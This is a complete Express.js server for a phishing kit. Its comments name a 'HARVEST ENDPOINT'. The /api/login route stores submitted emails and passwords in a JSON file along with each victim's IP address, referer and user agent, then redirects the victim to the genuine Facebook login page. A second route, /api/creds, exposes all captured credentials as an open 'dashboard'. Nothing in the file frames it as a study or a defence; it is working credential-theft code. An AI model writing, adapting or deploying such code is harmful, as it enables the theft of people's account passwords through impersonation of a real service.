const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('../client'));

// Creds storage
const credsPath = path.join(__dirname, 'uploads', 'creds.json');
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Robust IP detection for local + deployed (Render/Vercel)
const getClientIP = (req) => {
  // Proxy/CDN headers (Render, Vercel, Cloudflare)
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return Array.isArray(forwarded) 
      ? forwarded[0].split(',')[0].trim()
      : forwarded.split(',')[0].trim();
  }
  
  // Other proxy headers
  if (req.headers['x-real-ip']) return req.headers['x-real-ip'];
  if (req.headers['x-client-ip']) return req.headers['x-client-ip'];
  
  // Direct connection fallbacks
  return req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.ip ||
         'unknown';
};

// HARVEST ENDPOINT
app.post('/api/login', (req, res) => {
  try {
    const { email, pass } = req.body;
    if (!email || !pass) return res.status(400).json({error: 'Missing credentials'});
    
    const cred = {
      timestamp: new Date().toISOString(),
      ip: getClientIP(req),
      referer: req.get('Referer') || 'direct',
      email: email.trim(),
      password: pass,
      userAgent: req.get('User-Agent')?.substring(0, 200) || 'unknown'
    };
    
    // Ensure directory exists
    const dir = path.dirname(credsPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    
    const creds = fs.existsSync(credsPath) 
      ? JSON.parse(fs.readFileSync(credsPath, 'utf8'))
      : [];
    creds.push(cred);
    fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
    
    res.redirect('https://www.facebook.com/login');
  } catch (error) {
    console.error('Harvest error:', error);
    res.redirect('https://www.facebook.com/login');
  }
});

// DASHBOARD - View captured creds
app.get('/api/creds', (req, res) => {
  const creds = fs.existsSync(credsPath)
    ? JSON.parse(fs.readFileSync(credsPath, 'utf8'))
    : [];
  res.json(creds);
});

app.listen(5000, () => {
  console.log('🔥 Backend: http://localhost:5000');
  console.log('📁 Creds path:', credsPath);
});